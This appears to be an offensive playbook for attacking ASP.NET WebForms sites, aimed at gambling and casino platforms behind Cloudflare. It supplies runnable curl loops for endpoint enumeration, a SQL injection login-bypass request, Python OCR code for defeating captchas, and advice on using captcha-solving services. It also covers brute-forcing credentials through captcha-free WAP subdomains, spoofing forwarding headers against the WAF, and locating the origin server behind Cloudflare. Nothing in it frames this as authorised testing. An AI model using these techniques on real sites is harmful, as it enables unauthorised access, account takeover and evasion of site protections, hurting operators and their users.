# ASP.NET WebForms Recon & Exploitation

Attack surface and methodology for ASP.NET WebForms apps, especially gambling/casino platforms behind Cloudflare.

## Quick Fingerprint

```
X-Powered-By: ASP.NET
__VIEWSTATE, __VIEWSTATEGENERATOR, __EVENTVALIDATION hidden fields
ASP.NET_SessionId cookie
.aspx / .ashx / .axd extensions
WebResource.axd, ScriptResource.axd in JS sources
```

## ViewState Analysis

The `__VIEWSTATE` hidden field is base64-encoded. Decode the first byte to determine security:

| First Byte | Meaning | Exploitable? |
|-----------|---------|--------------|
| `0xFF` | Encrypted (SHA1/HMAC) | ❌ Need machineKey |
| `0x01` | MAC protected, not encrypted | ⚠️ Possible with known validationKey |
| `0x87` | MAC + Encrypted (most secure) | ❌ |
| `0x15` | UNENCRYPTED, MAC disabled | ✅ CRITICAL — deserialization attack |

```python
import base64
decoded = base64.b64decode(viewstate_value)
first_byte = decoded[0]  # Check against table above
```

### CRITICAL: ViewState Expires Per Request

**DO NOT attempt to brute-force captcha/credentials across multiple requests using the same ViewState.** Each POST consumes the ViewState and the server issues a new one. This means:
- Captcha brute force across 1000 values requires re-fetching ViewState for EACH attempt (or don't use ViewState at all — see WAP approach)
- Parallel brute force threads sharing one ViewState will all fail
- The correct approach for captcha bypass: OCR the captcha image, use it with the current ViewState, submit once

## Key Attack Paths

### 1. AXD Endpoint Enumeration

```bash
# Trace.axd — ASP.NET tracing (if enabled, leaks request data)
# Elmah.axd — Error logging (if enabled, full error dump)
# WebResource.axd / ScriptResource.axd — embedded resources
# WebAdmin.axd — admin interface
# Telerik.Web.UI.WebResource.axd — Telerik UI (CVE-2017-9248, CVE-2019-18935)

for axd in trace.axd Trace.axd elmah.axd WebResource.axd ScriptResource.axd WebAdmin.axd Telerik.Web.UI.WebResource.axd; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://TARGET/$axd")
  echo "$axd → $code"
done
```

**Interpreting AXD responses:**
- `302 → /desktop/errorpage` = endpoint exists but access denied (authenticated)
- `520` = origin error (Cloudflare → origin communication failure)
- `403` = WAF blocking
- `200` = ACCESSIBLE — investigate immediately

### 2. Form Parameter Extraction

ASP.NET WebForms uses nested control IDs. Extract them from the HTML:

```python
import re
# Login form inputs
user = re.search(r'UCLoginForm1.*?input_username', html, re.I)
pwd = re.search(r'UCLoginForm1.*?input_password', html, re.I)
cap = re.search(r'UCLoginForm1.*?input_captcha', html, re.I)
btn = re.search(r'UCLoginForm1.*?btnLogin', html, re.I)

# Full parameter names include the full control tree:
# ctl00$ctl00$UCDesktopMainHeader1_1$UCLoginForm1$input_username
# ctl00$ctl00$UCDesktopMainHeader1_1$UCLoginForm1$input_password
# ctl00$ctl00$UCDesktopMainHeader1_1$UCLoginForm1$input_captcha
# ctl00$ctl00$UCDesktopMainHeader1_1$UCLoginForm1$btnLogin
```

### 3. XSS Reality Check

ASP.NET WebForms **auto-HTML-encodes** all output by default. `<script>alert(1)</script>` becomes `&lt;script&gt;alert(1)&lt;/script&gt;`. This makes traditional XSS near-impossible unless:
- Output is rendered via `Literal` control with `Mode="PassThrough"`
- `@Html.Raw()` is used in Razor views
- A `GridView` or `Repeater` has `HtmlEncode="false"`

**Always test with `<b>BOLD</b>` first.** If it renders as `&lt;b&gt;BOLD&lt;/b&gt;`, move on — XSS is not viable here.

### 4. SQLi on WebForms

Test with `'` in form fields. If the server returns a 302 redirect to the same page, queries are likely parameterized. 520 errors from Cloudflare on certain payloads can indicate the origin is processing the input and crashing — a weak signal but worth investigating.

### 5. Captcha Bypass via OCR

When captcha is a 3-digit numeric image (70x30 px):

```python
from PIL import Image
import pytesseract

img = Image.open('captcha.png')
# Resize 4-5x for better OCR
big = img.resize((350, 150), Image.LANCZOS)
gray = big.convert('L')

# Try multiple thresholds and PSM modes
candidates = set()
for thresh in range(80, 200, 5):
    bw = gray.point(lambda x: 0 if x < thresh else 255, '1')
    for psm in [6, 7, 8]:
        text = pytesseract.image_to_string(bw, 
            config=f'--psm {psm} -c tessedit_char_whitelist=0123456789').strip()
        if text and len(text) >= 2:
            candidates.add(text)

# Most common reading is usually correct
```

**Pitfall:** OCR accuracy on 70x30 images is ~60-70%. If the captcha is server-side validated (not just client-side JS check), you'll need to re-fetch ViewState + captcha for each attempt. This makes OCR-based brute force impractical beyond ~10 attempts.

## WAP/WML Subdomain Hunting

Gambling sites often expose legacy WAP (Wireless Application Protocol) endpoints at `wap.DOMAIN` or `m.DOMAIN`. These are **gold mines** because:

1. **No ViewState** — WAP/WML uses simple `<go>` tags with `<postfield>`, not ASP.NET postback
2. **No captcha** — most WAP login forms skip captcha entirely
3. **No JavaScript** — WML is XML-based, no client-side validation
4. **Different auth logic** — often a completely separate codebase with weaker security

### Discovery

```bash
# Try WAP/mobile subdomains
for sub in m wap mobile wap2 m2; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$sub.TARGET")
  echo "$sub → $code"
done

# WAP endpoints
curl -sk "https://wap.TARGET/" | head -20
# Look for: <?xml version="1.0"?>, <!DOCTYPE wml, <wml>, <card>, <go>, <postfield>
```

### WAP Login Form Pattern

```xml
<card title="">
  <p>USERNAME : <input name="Username" /><br />
     PASSWORD : <input name="Pass" type="password" /></p>
  <p>
    <anchor title="Login">[Login]
      <go method="post" href="Login.aspx">
        <postfield name="username" value="$(Username)" />
        <postfield name="password" value="$(Pass)" />
      </go>
    </anchor>
  </p>
</card>
```

### WAP SQLi / Auth Bypass

Since WAP forms have no ViewState, CSRF token, or captcha, they're the best target for:
- SQL injection via `username` parameter
- Credential brute force
- Default credential testing

```bash
# SQLi on WAP login
curl -sk -L -c cookies.txt \
  -d "username=admin'--&password=test" \
  "https://wap.TARGET/wap/wml/Login.aspx"

# Check if response differs from normal login failure
```

### WAP Pitfall: Dummy Login Pages

Some WAP endpoints return a **static informational page** that looks like a login form but doesn't actually authenticate. Signs:
- Same response body regardless of credentials
- Same response body for valid vs invalid credentials
- No session cookie set after "login"
- Page content is entirely SEO/marketing text

**Always verify** by comparing responses from valid vs invalid credentials. If identical, the WAP login is a dummy.

### Register Pitfall: Dummy Registration

Some ASP.NET gambling sites have "registration" that returns "berhasil" / "sukses" / "selamat" but never actually creates an account. **Always verify by:** registering the same username again immediately. A real registration system should reject the duplicate with "username already exists". If it succeeds again with the same username, registration is a dummy — no account was created, and you cannot login with those credentials.

Signs of dummy registration:
- Registration succeeds with empty captcha
- Registration succeeds with the same username twice
- Login with registered credentials always fails (even with correct captcha)
- The JS bundle contains `error_UsernameExist` but the server never triggers it

## Captcha Solver API

When OCR accuracy is too low, use an external captcha solving service. Full workflow: get session + ViewState + captcha image in one round-trip, solve via API, login in a single shot. See `references/captcha-solver-integration.md` for the complete Python workflow.

## Cloudflare-Specific Notes

### 520 Errors

Cloudflare 520 = "origin returned an empty/unknown response." Common causes on ASP.NET:
- `.axd` endpoints with invalid parameters
- SQLi payloads that crash the backend
- Path traversal that hits IIS errors
- `global.asax` or `web.config` access attempts

520 ≠ vulnerability by itself, but it reveals the origin is processing the request differently than normal.

### 403 on API Paths

Cloudflare WAF blocks `/api/`, `/admin/`, etc. by default. A 403 with a Cloudflare-styled error page means the WAF is active. Try:
- IP-based bypass headers: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`
- These almost never work on well-configured WAFs but are worth one attempt

### Origin Identification

Behind Cloudflare, the real origin may be exposed via:
- `server: nginx` in 404 responses (Cloudflare typically shows `server: cloudflare`)
- MX/SPF/TXT DNS records that resolve to non-Cloudflare IPs
- `report-to` / NEL headers with origin endpoints
- Historical DNS (SecurityTrails)